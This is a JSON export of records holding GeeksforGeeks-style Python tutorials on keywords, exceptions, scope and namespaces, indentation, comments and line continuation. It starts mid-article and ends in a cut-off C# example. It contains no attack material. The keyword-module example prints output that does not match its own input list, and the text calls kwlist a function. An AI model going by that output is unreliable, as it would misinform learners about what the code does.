explained above, this works together with \u201ctry\u201d to catch exceptions.finally : No matter what is result of the \u201ctry\u201d block, block termed \u201cfinally\u201d is always executed.raise: We can raise an exception explicitly with the raise keywordassert: This function is used for debugging purposes. Usually used to check the correctness of code. If a statement is evaluated to be true, nothing happens, but when it is false, \u201cAssertionError\u201d is raised. One can also print a message with the error, separated by a comma.Example: try, except, raise, finally, and assert KeywordsPython3# initializing numbera = 4b = 0\u00a0\u00a0# No exception Exception raised in try blocktry:\u00a0\u00a0\u00a0\u00a0k = a//b # raises divide by zero exception.\u00a0\u00a0\u00a0\u00a0print(k)\u00a0\u00a0# handles zerodivision exceptionexcept ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0print(\"Can't divide by zero\")\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0# this block is always executed\u00a0\u00a0\u00a0\u00a0# regardless of exception generation.\u00a0\u00a0\u00a0\u00a0print('This is always executed')\u00a0\u00a0# assert Keyword\u00a0\u00a0# using assert to check for 0print (\"The value of a / b is : \")assert b != 0, \"Divide by 0 error\"print (a / b)OutputCan't divide by zero\r\nThis is always executed\r\nThe value of a / b is :\r\nAssertionError: Divide by 0 errorNote: For more information refer to our tutorial Exception Handling Tutorial in Python.deldel is used to delete a reference to an object. Any variable or list value can be deleted using del.Example: del KeywordPython3my_variable1 = 20my_variable2 = \"GeeksForGeeks\"\u00a0\u00a0# check if my_variable1 and my_variable2 existsprint(my_variable1)print(my_variable2)\u00a0\u00a0# delete both the variablesdel my_variable1del my_variable2\u00a0\u00a0# check if my_variable1 and my_variable2 existsprint(my_variable1)print(my_variable2)Output20\r\nGeeksForGeeks\r\nNameError: name 'my_variable1' is not definedGlobal, Nonlocalglobal: This keyword is used to define a variable inside the function to be of a global scope.non-local : This keyword works similar to the global, but rather than global, this keyword declares a variable to point to variable of outside enclosing function, in case of nested functions.Example: Global and nonlocal keywordsPython3# global variablea = 15b = 10\u00a0\u00a0# function to perform additiondef add():\u00a0\u00a0\u00a0\u00a0c = a + b\u00a0\u00a0\u00a0\u00a0print(c)\u00a0\u00a0# calling a functionadd()\u00a0\u00a0# nonlocal keyworddef fun():\u00a0\u00a0\u00a0\u00a0var1 = 10\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def gun():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# tell python explicitly that it\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# has to access var1 initialized\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# in fun on line 2\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# using the keyword nonlocal\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0nonlocal var1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0var1 = var1 + 10\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(var1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0gun()fun()Output25\r\n20\r\nNote: For more information, refer to our Global and local variables tutorial in Python.This article is contributed by Manjeet Singh(S. Nandini). If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e06e13ad4f82222f9642d3859439e141",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python Keywords \u2013 Introduction\u00a0Keywords in Python | Set 1\u00a0More keywords:16. try : This keyword is used for exception handling, used to catch the errors in the code using the keyword except. Code in \u201ctry\u201d block is checked, if there is any type of error, except block is executed.17. except : As explained above, this works together with \u201ctry\u201d to catch exceptions.18. raise : Also used for exception handling to explicitly raise exceptions.19. finally : No matter what is result of the \u201ctry\u201d block, block termed \u201cfinally\u201d is always executed. Detailed article \u2013Exception Handling in Python20. for : This keyword is used to control flow and for looping.21. while : Has a similar working like \u201cfor\u201d , used to control flow and for looping.22. pass : It is the null statement in python. Nothing happens when this is encountered. This is used to prevent indentation errors and used as a placeholderDetailed Article \u2013 for, while, pass23. import : This statement is used to include a particular module into current program.24. from : Generally used with import, from is used to import particular functionality from the module imported.25. as : This keyword is used to create the alias for the module imported. i.e giving a new name to the imported module. E.g import math as mymath.Detailed Article \u2013\u00a0import, from and as26. lambda : This keyword is used to make inline returning functions with no statements allowed internally. Detailed Article \u2013\u00a0map, filter, lambda27. return : This keyword is used to return from the function. Detailed article \u2013 \u00a0Return values in Python.28. yield : This keyword is used like return statement but is used to return a generator. Detailed Article\u00a0\u2013\u00a0yield keyword29. with : This keyword is used to wrap the execution of block of code within methods defined by context manager.This keyword is not used much in day to day programming.30. in : This keyword is used to check if a container contains a value. This keyword is also used to loop through the container.31. is : This keyword is used to test object identity, i.e to check if both the objects take same memory location or not.\u00a0Python# Python code to demonstrate working of# in and is\u00a0# using \"in\" to checkif 's' in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"s is part of geeksforgeeks\")else : print (\"s is not part of geeksforgeeks\")\u00a0# using \"in\" to loop throughfor i in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0print (i,end=\" \")\u00a0print (\"\\r\")\u00a0\u00a0\u00a0\u00a0\u00a0# using is to check object identity# string is immutable( cannot be changed once allocated)# hence occupy same memory locationprint (' ' is ' ')\u00a0# using is to check object identity# dictionary is mutable( can be changed once allocated)# hence occupy different memory locationprint ({} is {})Output:\u00a0s is part of geeksforgeeks\ng e e k s f o r g e e k s \nTrue\nFalse32. global : This keyword is used to define a variable inside the function to be of a global scope.33. non-local : This keyword works similar to the global, but rather than global, this keyword declares a variable to point to variable of outside enclosing function, in case of nested functions.Python# Python code to demonstrate working of# global and non local\u00a0#initializing variable globallya = 10\u00a0# used to read the variabledef read():\u00a0\u00a0\u00a0\u00a0print (a)\u00a0# changing the value of globally defined variabledef mod1():\u00a0\u00a0\u00a0\u00a0global a\u00a0\u00a0\u00a0\u00a0a = 5\u00a0# changing value of only local variabledef mod2():\u00a0\u00a0\u00a0\u00a0a = 15\u00a0# reading initial value of a# prints 10read()\u00a0# calling mod 1 function to modify value# modifies value of global a to 5mod1()\u00a0# reading modified value# prints 5read()\u00a0# calling mod 2 function to modify value# modifies value of local a to 15, doesn't effect global valuemod2()\u00a0# reading modified value# again prints 5read()\u00a0# demonstrating non local# inner loop changing the value of outer a# prints 10print (\"Value of a using nonlocal is : \",end=\"\")def outer():\u00a0\u00a0\u00a0\u00a0a = 5\u00a0\u00a0\u00a0\u00a0def inner():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0nonlocal a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a = 10\u00a0\u00a0\u00a0\u00a0inner()\u00a0\u00a0\u00a0\u00a0print (a)\u00a0outer()\u00a0# demonstrating without non local# inner loop not changing the value of outer a# prints 5print (\"Value of a without using nonlocal is : \",end=\"\")def outer():\u00a0\u00a0\u00a0\u00a0a = 5\u00a0\u00a0\u00a0\u00a0def inner():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a = 10\u00a0\u00a0\u00a0\u00a0inner()\u00a0\u00a0\u00a0\u00a0print (a)\u00a0outer()Output:\u00a010\n5\n5\nValue of a using nonlocal is : 10\nValue of a without using nonlocal is : 5\u00a0This article is contributed by Manjeet Singh(S. Nandini). If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3e41eeb146e4655d15c5f3653ed4f549",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "What is namespace:A namespace is a system that has a unique name for each and every object in Python. An object might be a variable or a method. Python itself maintains a namespace in the form of a Python dictionary. Let\u2019s go through an example, a directory-file system structure in computers. Needless to say, that one can have multiple directories having a file with the same name inside every directory. But one can get directed to the file, one wishes, just by specifying the absolute path to the file.\u00a0Real-time example, the role of a namespace is like a surname. One might not find a single \u201cAlice\u201d in the class there might be multiple \u201cAlice\u201d but when you particularly ask for \u201cAlice Lee\u201d or \u201cAlice Clark\u201d (with a surname), there will be only one (time being don\u2019t think of both first name and surname are same for multiple students).On similar lines, the Python interpreter understands what exact method or variable one is trying to point to in the code, depending upon the namespace. So, the division of the word itself gives a little more information. Its Name (which means name, a unique identifier) + Space(which talks something related to scope). Here, a name might be of any Python method or variable and space depends upon the location from where is trying to access a variable or a method.\u00a0Types of namespaces :\u00a0When Python interpreter runs solely without any user-defined modules, methods, classes, etc. Some functions like print(), id() are always present, these are built-in namespaces. When a user creates a module, a global namespace gets created, later the creation of local functions creates the local namespace. The built-in namespace encompasses the global namespace and the global namespace encompasses the local namespace.\u00a0The lifetime of a namespace :\u00a0A lifetime of a namespace depends upon the scope of objects, if the scope of an object ends, the lifetime of that namespace comes to an end. Hence, it is not possible to access the inner namespace\u2019s objects from an outer namespace.\u00a0Example:\u00a0Python3# var1 is in the global namespacevar1 = 5def some_func():\u00a0\u00a0\u00a0\u00a0\u00a0# var2 is in the local namespace\u00a0\u00a0\u00a0\u00a0var2 = 6\u00a0\u00a0\u00a0\u00a0def some_inner_func():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# var3 is in the nested local\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# namespace\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0var3 = 7As shown in the following figure, the same object name can be present in multiple namespaces as isolation between the same name is maintained by their namespace.But in some cases, one might be interested in updating or processing global variables only, as shown in the following example, one should mark it explicitly as global and the update or process. \u00a0 Note that the line \u201ccount = count +1\u201d references the global variable and therefore uses the global variable, but compare this to the same line written \u201ccount = 1\u201d. \u00a0Then the line \u201cglobal count\u201d is absolutely needed according to scope rules.Python3# Python program processing# global variable\u00a0count = 5def some_method():\u00a0\u00a0\u00a0\u00a0global count\u00a0\u00a0\u00a0\u00a0count = count + 1\u00a0\u00a0\u00a0\u00a0print(count)some_method()Output:\u00a06Scope of Objects in Python :\u00a0Scope refers to the coding region from which a particular Python object is accessible. Hence one cannot access any particular object from anywhere from the code, the accessing has to be allowed by the scope of the object.Let\u2019s take an example to have a detailed understanding of the same:\u00a0\u00a0Example 1:\u00a0Python3# Python program showing# a scope of object\u00a0def some_func():\u00a0\u00a0\u00a0\u00a0print(\"Inside some_func\")\u00a0\u00a0\u00a0\u00a0def some_inner_func():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0var = 10\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Inside inner function, value of var:\",var)\u00a0\u00a0\u00a0\u00a0some_inner_func()\u00a0\u00a0\u00a0\u00a0print(\"Try printing var from outer function: \",var)some_func()Output:\u00a0Inside some_func\nInside inner function, value of var: 10\n\nTraceback (most recent call last):\n  File \"/home/1eb47bb3eac2fa36d6bfe5d349dfcb84.py\", line 8, in \n    some_func()\n  File \"/home/1eb47bb3eac2fa36d6bfe5d349dfcb84.py\", line 7, in some_func\n    print(\"Try printing var from outer function: \",var)\nNameError: name 'var' is not definedMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "2c73c02f0cddbcaaa00992995729d60a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "StatementsInstructions written in the source code for execution are called statements. There are different types of statements in the Python programming language like Assignment statements, Conditional statements, Looping statements, etc. These all help the user to get the required output. For example, n = 50 is an assignment statement.Multi-Line Statements: Statements in Python can be extended to one or more lines using parentheses (), braces {}, square brackets [], semi-colon (;), continuation character slash (\\). When the programmer needs to do long calculations and cannot fit his statements into one line, one can make use of these characters.\u00a0Example :\u00a0\u00a0Declared using Continuation Character (\\):\ns = 1 + 2 + 3 + \\\n    4 + 5 + 6 + \\\n    7 + 8 + 9\n\nDeclared using parentheses () :\nn = (1 * 2 * 3 + 7 + 8 + 9)\n\nDeclared using square brackets [] :\nfootballer = ['MESSI',\n          'NEYMAR',\n          'SUAREZ']\n\nDeclared using braces {} :\nx = {1 + 2 + 3 + 4 + 5 + 6 +\n     7 + 8 + 9}\n\nDeclared using semicolons(;) :\nflag = 2; ropes = 3; pole = 4\u00a0IndentationA block is a combination of all these statements. Block can be regarded as the grouping of statements for a specific purpose. Most of the programming languages like C, C++, Java use braces { } to define a block of code. One of the distinctive features of Python is its use of indentation to highlighting the blocks of code. Whitespace is used for indentation in Python. All statements with the same distance to the right belong to the same block of code. If a block has to be more deeply nested, it is simply indented further to the right. You can understand it better by looking at the following lines of code:\u00a0Python3# Python program showing# indentation\u00a0site = 'gfg'\u00a0if site == 'gfg':\u00a0\u00a0\u00a0\u00a0print('Logging on to geeksforgeeks...')else:\u00a0\u00a0\u00a0\u00a0print('retype the URL.')print('All set !')Output:\u00a0\u00a0Logging on to geeksforgeeks...\nAll set !The lines print(\u2018Logging on to geeksforgeeks\u2026\u2019) and print(\u2018retype the URL.\u2019) are two separate code blocks. The two blocks of code in our example if-statement are both indented four spaces. The final print(\u2018All set!\u2019) is not indented, and so it does not belong to the else-block.\u00a0\u00a0Python3j = 1while(j<= 5):\u00a0\u00a0\u00a0\u00a0\u00a0print(j)\u00a0\u00a0\u00a0\u00a0\u00a0j = j + 1Output:\u00a0\u00a01\n2\n3\n4\n5To indicate a block of code in Python, you must indent each line of the block by the same whitespace. The two lines of code in the while loop are both indented four spaces. It is required for indicating what block of code a statement belongs to. For example, j=1 and while(j<=5): is not indented, and so it is not within the while block. So, Python code structures by indentation.\u00a0CommentsPython developers often make use of the comment system as, without the use of it, things can get real confusing, real fast. Comments are the useful information that the developers provide to make the reader understand the source code. It explains the logic or a part of it used in the code. Comments are usually helpful to someone maintaining or enhancing your code when you are no longer around to answer questions about it. These are often cited as a useful programming convention that does not take part in the output of the program but improves the readability of the whole program. There are two types of comments in Python:\u00a0Single line comments: Python single line comment starts with hashtag symbol with no white spaces (#) and lasts till the end of the line. If the comment exceeds one line then put a hashtag on the next line and continue the comment. Python\u2019s single-line comments are proved useful for supplying short explanations for variables, function declarations, and expressions. See the following code snippet demonstrating single line comment:Code 1:\u00a0\u00a0Python3# This is a comment# Print \u201cGeeksforGeeks !\u201d to consoleprint(\"GeeksforGeeks\")Code 2:\u00a0\u00a0Python3a, b = 1, 3 # Declaring two integerssum = a + b # adding two integersprint(sum) # displaying the outputMulti-line string as a comment: Python multi-line comment is a piece of text enclosed in a delimiter (\u201c\u201d\u201d) on each end of the comment. Again there should be no white space between delimiter (\u201c\u201d\u201d). They are useful when the comment text does not fit into one line; therefore need to span across lines. Multi-line comments or paragraphs serve as documentation for others reading your code. See the following code snippet demonstrating multi-line comment:Code 1:\u00a0\u00a0Python3\"\"\"This would be a multiline comment in Python thatspans several lines and describes geeksforgeeks.A Computer Science portal for geeks. It containswell written, well thoughtand well-explained computer scienceand programming articles,quizzes and more.\u2026\"\"\"print(\"GeeksForGeeks\")Code 2:\u00a0\u00a0Python3'''This article on geeksforgeeks gives you aperfect example ofmulti-line comments'''\u00a0print(\"GeeksForGeeks\")My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ef46b8ab8a1281b59aae16c1ca9ec89d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, you would come to know about proper structuring and formatting your python programs.Python Statements In general, the interpreter reads and executes the statements line by line i.e sequentially. Though, there are some statements that can alter this behavior like conditional statements.\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 Mostly, python statements are written in such a format that one statement is only written in a single line. The interpreter considers the \u2018new line character\u2019 as the terminator of one instruction. But, writing multiple statements per line is also possible that you can find below.Examples:# Example 1\u00a0\u00a0print('Welcome to Geeks for Geeks')\u00a0Output:\r\nWelcome to Geeks for Geeks\r\n# Example 2\u00a0\u00a0x = [1, 2, 3, 4]\u00a0\u00a0# x[1:3] means that start from the index\u00a0# 1 and go upto the index 2print(x[1:3])\u00a0\u00a0\u00a0\u00a0\"\"\" In the above mentioned format, the first\u00a0index is included, but the last index is notincluded.\"\"\"Output:\r\n[2, 3]\r\nMultiple Statements per Line We can also write multiple statements per line, but it is not a good practice as it reduces the readability of the code. Try to avoid writing multiple statements in a single line. But, still you can write multiple lines by terminating one statement with the help of \u2018;\u2019. \u2018;\u2019 is used as the terminator of one statement in this case.\u00a0 \u00a0 \u00a0 \u00a0 For Example, consider the following code.# Example\u00a0\u00a0a = 10; b = 20; c = b + a\u00a0\u00a0print(a); print(b); print(c)Output:\r\n10\r\n20\r\n30\r\nLine Continuation to avoid left and right scrollingSome statements may become very long and may force you to scroll the screen left and right frequently. You can fit your code in such a way that you do not have to scroll here and there. Python allows you to write a single statement in multiple lines, also known as line continuation. Line continuation enhances readability as well.# Bad Practice as width of this code is too much.\r\n \r\n#code\r\nx = 10\r\ny = 20\r\nz = 30\r\nno_of_teachers = x\r\nno_of_male_students = y\r\nno_of_female_students = z\r\n \r\nif (no_of_teachers == 10 and no_of_female_students == 30 and no_of_male_students == 20 and (x + y) == 30):\r\n    print('The course is valid')\r\n \r\n# This could be done instead:\r\n \r\nif (no_of_teachers == 10 and no_of_female_students == 30\r\n    and no_of_male_students == 20 and x + y == 30):\r\n    print('The course is valid')Types of Line ContinuationIn general, there are two types of line continuationImplicit Line ContinuationThis is the most straightforward technique in writing a statement that spans multiple lines.Any statement containing opening parentheses (\u2018(\u2018), brackets (\u2018[\u2018), or curly braces (\u2018{\u2018) is presumed to be incomplete until all matching parentheses, square brackets, and curly braces have been encountered. Until then, the statement can be implicitly continued across lines without raising an error.Examples:# Example 1\u00a0\u00a0# The following code is valida = [\u00a0\u00a0\u00a0\u00a0[1, 2, 3],\u00a0\u00a0\u00a0\u00a0[3, 4, 5],\u00a0\u00a0\u00a0\u00a0[5, 6, 7]\u00a0\u00a0\u00a0\u00a0]\u00a0\u00a0print(a)Output:\r\n[[1, 2, 3], [3, 4, 5], [5, 6, 7]]\r\n# Example 2# The following code is also valid\u00a0\u00a0person_1 = 18person_2 = 20person_3 = 12\u00a0\u00a0if (\u00a0\u00a0\u00a0person_1 >= 18 and\u00a0\u00a0\u00a0person_2 >= 18 and\u00a0\u00a0\u00a0person_3 < 18\u00a0\u00a0\u00a0):\u00a0\u00a0\u00a0\u00a0print('2 Persons should have ID Cards')Output:\r\n2 Persons should have ID Cards\r\nExplicit Line ContinuationExplicit Line joining is used mostly when implicit line joining is not applicable. In this method, you have to use a character that helps the interpreter to understand that the particular statement is spanning more than one lines.\u00a0 \u00a0 \u00a0 \u00a0 Backslash (\\) is used to indicate that a statement spans more than one line. The point is to be noted that \u201d must be the last character in that line, even white-space is not allowed.See the following example for clarification# Example\u00a0\u00a0x = \\\u00a0\u00a0\u00a0\u00a01 + 2 \\\u00a0\u00a0\u00a0\u00a0+ 5 + 6 \\\u00a0\u00a0\u00a0\u00a0+ 10\u00a0\u00a0print(x)Output:\r\n24\r\nComments in PythonWriting comments in the code are very important and they help in code readability and also tell more about the code. It helps you to write details against a statement or a chunk of code. Interpreter ignores the comments and does not count them in commands. In this section, we\u2019ll learn how to write comments in Python.\u00a0 \u00a0 \u00a0 \u00a0 Symbols used for writing comments include Hash (#) or Triple Double Quotation marks(\u201c\u201d\u201d). Hash is used in writing single line comments that do not span multiple lines. Triple Quotation Marks are used to write multiple line comments. Three triple quotation marks to start the comment and again three quotation marks to end the comment.Consider the following examples:# Example 1\u00a0\u00a0####### This example will print Hello World ####### print('Hello World')\u00a0 # This is a comment# Example 2\u00a0\u00a0\"\"\" This example will demonstrate\u00a0\u00a0\u00a0\u00a0\u00a0multiple comments \"\"\"\u00a0\u00a0\"\"\" The following\u00a0\u00a0\u00a0\u00a0a variable contains the\u00a0\u00a0\u00a0\u00a0\u00a0string 'How old are you?'\"\"\"a = 'How old are you?'\u00a0\u00a0\"\"\" The following statement prints\u00a0\u00a0\u00a0\u00a0what's inside the variable a\u00a0\"\"\"print(a)Note Do note that Hash (#) inside a string does not make it a comment. Consider the following example for demonstration.# Example\u00a0\u00a0\"\"\" The following statement prints the string stored\u00a0\u00a0\u00a0\u00a0in the variable \"\"\"\u00a0\u00a0a = 'This is # not a comment #'print(a) # Prints the string stored in aWhite spacesThe most common whitespace characters are the following:CharacterASCII CodeLiteral ExpressionSpace32 (0x20)\u2018\u00a0\u2018tab9 (0x9)\u2018\\t\u2019newline10 (0xA)\u2018\\n\u2019* You can always refer to ASCII Table by clicking here.Whitespace is mostly ignored, and mostly not required, by the Python interpreter. When it is clear where one token ends and the next one starts, whitespace can be omitted. This is usually the case when special non-alphanumeric characters are involved.Examples:# Example 1\u00a0\u00a0# This is correct but whitespace can improve readability\u00a0\u00a0a = 1-2\u00a0 # Better way is a = 1 - 2\u00a0\u00a0print(a)# Example 2\u00a0\u00a0# This is correct# Whitespace here can improve readability.x = 10flag =(x == 10)and(x<12)print(flag)\u00a0\u00a0\"\"\" Readable form could be as followsx = 10flag = (x == 10) and (x < 12)print(flag)\"\"\"\u00a0\u00a0# Try the more readable code yourselfWhitespaces are necessary in separating the keywords from the variables or other keywords. Consider the following example.# Example\u00a0\u00a0x = [1, 2, 3]y = 2\u00a0\u00a0\"\"\" Following is incorrect, and will generate syntax errora = yin x\"\"\"\u00a0\u00a0# Corrected version is written asa = y in xprint(a)Whitespaces as IndentationPython\u2019s syntax is quite easy, but still you have to take some care in writing the code. Indentation is used in writing python codes.\u00a0 \u00a0 \u00a0 \u00a0 Whitespaces before a statement have significant role and are used in indentation. Whitespace before a statement can have a different meaning. Let\u2019s try an example.# Example\u00a0\u00a0print('foo') # Correct\u00a0\u00a0\u00a0\u00a0\u00a0print('foo') # This will generate an error\u00a0\u00a0# The error would be somewhat 'unexpected indent'Leading whitespaces are used to determine the grouping of the statements like in loops or control structures etc.Example:# Example\u00a0\u00a0x = 10\u00a0\u00a0while(x != 0):\u00a0\u00a0\u00a0if(x > 5):\u00a0\u00a0 # Line 1\u00a0\u00a0print('x > 5')\u00a0 # Line 2\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 # Line 3\u00a0\u00a0print('x < 5') # Line 4\u00a0x -= 2\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 # Line 5\u00a0\u00a0\"\"\"Lines 1, 3, 5 are on same levelLine 2 will only be executed if if condition becomes true.Line 4 will only be executed if if condition becomes false.\"\"\"Output:\r\nx > 5\r\nx > 5\r\nx > 5\r\nx < 5\r\nx < 5\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4c82a1829b1061cb0a89f95c8966d13d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Defining a KeywordIn programming, a keyword is a \u201creserved word\u201d by the language which conveys special meaning to the interpreter. It may be a command or a parameter. Keywords cannot be used as a variable name in the program snippet.Keywords in Python: \u00a0Python language also reserves some keywords that convey special meaning. Knowledge of these is a necessary part of learning this language. Below is a list of keywords registered by python.\u00a0False, elif, lambda,\u00a0None, else, nonlocal,\u00a0True, except, not,\u00a0and, finally, or,\u00a0as, for, pass,\u00a0assert, from, raise,\u00a0break, global, return,\u00a0class, if, try,\u00a0continue, import, while\u00a0def, in, with,\u00a0del is, yield,\u00a0\u00a0How to check if a string is a keyword?Python in its language defines an inbuilt module \u201ckeyword\u201d which handles certain operations related to keywords. A function \u201ciskeyword()\u201d checks if a string is a keyword or not. Returns true if a string is a keyword, else returns false.\u00a0Python#Instead of writing this massive Python code#we can also code this in a different way\u00a0#Python code to demonstrate working of iskeyword()\u00a0# importing \"keyword\" for keyword operationsimport keywordimport keyword# initializing strings for testing while putting them in an arraykeys = [\"for\", \"while\", \"tanisha\", \"break\", \"sky\",\"elif\", \"assert\", \"pulkit\", \"lambda\", \"else\", \"sakshar\"]\u00a0for i in range(len(keys)):\u00a0\u00a0\u00a0\u00a0\u00a0# checking which are keywords\u00a0\u00a0\u00a0\u00a0if keyword.iskeyword(keys[i]):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(keys[i] + \" is python keyword\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(keys[i] + \" is not a python keyword\")Output:\u00a0\u00a0for is a python keyword\ngeeksforgeeks is not a python keyword\nelif is a python keyword\nelseif is not a python keyword\nnikhil is not a python keyword\nassert is a python keyword\nshambhavi is not a python keyword\nTrue is a python keyword\nFalse is a python keyword\nakshat is not a python keyword\nakash is not a python keyword\nbreak is a python keyword\nashty is not a python keyword\nlambda is a python keyword\nsuman is not a python keyword\ntry is a python keyword\nvaishnavi is not a python keyword\u00a0How to print a list of all keywordsSometimes, remembering all the keywords can be a difficult task while assigning variable names. Hence a function \u201ckwlist()\u201d is provided in the \u201ckeyword\u201d module which prints all the 33 python keywords.\u00a0Python#Python code to demonstrate working of iskeyword()\u00a0# importing \"keyword\" for keyword operationsimport keyword\u00a0# printing all keywords at once using \"kwlist()\"print (\"The list of keywords is : \")print (keyword.kwlist)Output:\u00a0\u00a0The list of keywords is : \n['False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', \n'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', \n'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', \n'nonlocal', 'not', 'or', 'pass', 'raise', 'return', \n'try', 'while', 'with', 'yield']\u00a0\u00a0\u00a0Next Articles:\u00a0\u00a0Keywords in Python | Set 1Keywords in Python | Set 2This article is contributed by Manjeet Singh(S.Nandini). If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c8291e1a995a6f20e9e73a7a754dc668",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article discusses methods to assign values to variables.\u00a0Method 1: Direct Initialisation Method\u00a0C++// C++ code to demonstrate variable assignment// upon condition using Direct Initialisation Method\u00a0#include <bits/stdc++.h>using namespace std;\u00a0int main(){\u00a0\u00a0\u00a0\u00a0// initialising variables directly\u00a0\u00a0\u00a0\u00a0int a = 5;\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0cout << \"The value of a is: \" << a;}C// C code to demonstrate variable assignment// upon condition using Direct Initialisation Method\u00a0#include <stdio.h>\u00a0int main(){\u00a0\u00a0\u00a0\u00a0// initialising variables directly\u00a0\u00a0\u00a0\u00a0int a = 5;\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0printf(\"The value of a is: %d\", a);}Java// Java code to demonstrate variable assignment// upon condition using Direct Initialisation Method\u00a0import java.io.*;\u00a0class GFG {\u00a0\u00a0\u00a0\u00a0public static void main(String args[])\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// initialising variables directly\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int a = 5;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(\"The value of a is: \" + a);\u00a0\u00a0\u00a0\u00a0}}Python3# Python 3 code to demonstrate variable assignment# upon condition using Direct Initialisation Method\u00a0# initialising variable directlya = 5\u00a0# printing value of aprint (\"The value of a is: \" + str(a))C#// C# code to demonstrate variable assignment// upon condition using Direct Initialisation Methodusing System;\u00a0\u00a0class GFG{\u00a0\u00a0\u00a0\u00a0\u00a0public static void Main(String []args){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// Initialising variables directly\u00a0\u00a0\u00a0\u00a0int a = 5;\u00a0\u00a0\u00a0\u00a0\u00a0// Printing value of 